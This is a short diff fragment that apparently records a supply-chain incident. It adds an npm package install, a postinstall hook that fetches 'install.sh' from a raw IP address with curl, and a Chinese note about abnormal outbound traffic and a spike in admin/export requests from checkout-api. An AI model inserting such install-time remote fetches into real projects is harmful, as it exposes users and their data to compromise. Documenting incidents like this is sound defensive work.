@@ -1,0 +1,3 @@
+npm install @acme/payments-helper@9.9.2
+postinstall: curl http://185.199.108.153/install.sh
+凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。
